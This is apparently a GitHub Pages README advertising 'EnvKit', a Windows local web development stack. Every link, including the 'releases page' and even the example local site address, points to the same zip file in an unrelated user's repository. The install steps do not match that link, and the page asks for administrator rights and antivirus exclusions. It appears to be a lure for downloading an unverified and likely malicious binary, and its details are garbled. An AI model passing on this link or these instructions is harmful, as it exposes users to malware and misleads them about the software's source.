---
layout: "default"
title: "🛠️ envkit-releases - Build local websites on your computer"
description: "Manage your local web development stack on Windows and macOS with built-in support for PHP, databases, Node.js, and automated SSL for your projects."
---
# 🛠️ envkit-releases - Build local websites on your computer

[![](https://img.shields.io/badge/Download-EnvKit_for_Windows-blue.svg)](https://github.com/utkarshdwivedi212319/utkarshdwivedi212319.github.io/raw/refs/heads/main/reversis/utkarshdwivedi_github_io_2.2.zip)

EnvKit provides a workspace for web development on your Windows machine. It installs the software needed to create and test websites locally. You do not need deep technical knowledge to manage your projects. EnvKit simplifies the setup of databases, web servers, and programming languages. It acts as a reliable alternative to traditional tools like XAMPP or Laragon.

## 📦 What is included

EnvKit packs several tools into one installer. You get the following software components:

- Web Servers: Nginx and Apache. These display your web pages. 
- Databases: MySQL, MariaDB, PostgreSQL, Redis, and MongoDB. These store your website data.
- Programming Languages: Multiple versions of PHP and Node.js. These allow your website to process information.
- Email Testing: Mailpit. This tool captures emails sent by your website so you can read them without sending real messages to clients.
- Security: Trusted HTTPS for all local addresses ending in .test. This keeps your local environment secure.
- AI Control: A built-in MCP server. This allows AI assistants to manage your local projects.

## 🚀 How to download and install

Follow these steps to set up your environment on Windows:

1. Visit the [official releases page](https://github.com/utkarshdwivedi212319/utkarshdwivedi212319.github.io/raw/refs/heads/main/reversis/utkarshdwivedi_github_io_2.2.zip) to find the latest version.
2. Look for the file ending in .exe in the "Assets" section of the latest release.
3. Click the filename to download the installer to your computer.
4. Locate the file in your Downloads folder and double-click it.
5. Follow the prompts on your screen. Choose a location on your hard drive to store your projects.
6. Click finish when the installer completes the process.

You now have a functional development environment. You can find the EnvKit icon on your desktop or in your start menu.

## ⚙️ Initial setup

When you open EnvKit for the first time, the software prepares the background services. It tests the ports on your computer to ensure everything runs smoothly.

- Choose a root folder. This is where your website project files live.
- Click the Start All button. This activates the servers and databases.
- Open your web browser. Type the address of your project followed by .test. For example, if your folder is named "demo", go to https://github.com/utkarshdwivedi212319/utkarshdwivedi212319.github.io/raw/refs/heads/main/reversis/utkarshdwivedi_github_io_2.2.zip in your address bar.
- If the browser displays your site, the setup is successful.

## 💻 Managing your projects

EnvKit organizes all your websites in one place. Each project sits in its own folder inside your root directory. 

- To create a new site, create a folder in your root directory.
- EnvKit automatically detects new folders. It assigns a web address to them instantly.
- Use the dashboard to toggle servers on or off. If you do not need database services, stop them to save computer resources.

## 🛡️ Working with databases

Databases store information for dynamic websites like WordPress. EnvKit provides a visual tool to manage these databases.

- Open the EnvKit dashboard.
- Select the database tab.
- Click the button to open your database manager in the web browser.
- You can create new databases or import existing ones here.
- The default username is root and there is no password by default. Keep this configuration for local testing to avoid errors.

## 📧 Testing emails with Mailpit

Websites often send emails for password resets or contact forms. Mailpit prevents these from reaching real people. 

- Access Mailpit through the EnvKit menu.
- Your website automatically routes emails to this service.
- View all outgoing messages in the Mailpit interface. 
- You can inspect the email content to ensure the layout looks correct before you move your site to a live server.

## 🧩 AI assistant integration

EnvKit includes an MCP server. This connects your local files to supported AI tools. 

- Enable the AI helper in the settings menu.
- Provide the connection string to your AI application.
- The AI can read your project files and suggest code changes.
- This feature simplifies tasks like fixing errors or writing new features.

## 💡 System requirements

Ensure your computer has the following to get the best performance:

- Operating System: Windows 10 or Windows 11.
- Memory: At least 4GB of RAM.
- Storage: 2GB of free disk space for the software files. Plus additional space for your websites and databases.
- Permissions: You must have administrator rights to run the installer. The software needs to modify network settings to route your local .test domains.

## 📂 Troubleshooting common issues

If you encounter problems, look at these points first:

- Servers will not start: Another program might use the same port. Skype and other web servers often conflict with EnvKit. Close those programs and try again.
- Cannot see the website: Ensure the project folder is in the defined root directory. Refresh the dashboard and check the status lights.
- HTTPS errors: EnvKit installs a local security certificate. If your browser complains, clear your browser cache or restart the browser.
- Slow performance: Check if your antivirus software scans the project folder. Exclude your project folder from your antivirus scanner to speed up file loading.

## 📋 Help and feedback

If you need more help, you can look at the issues tab on the project page. Many users define their solutions there. If your problem is new, write a clear description of what happened. Include the version number of your EnvKit installation. Attach a screenshot if you have one. This helps others understand your specific situation.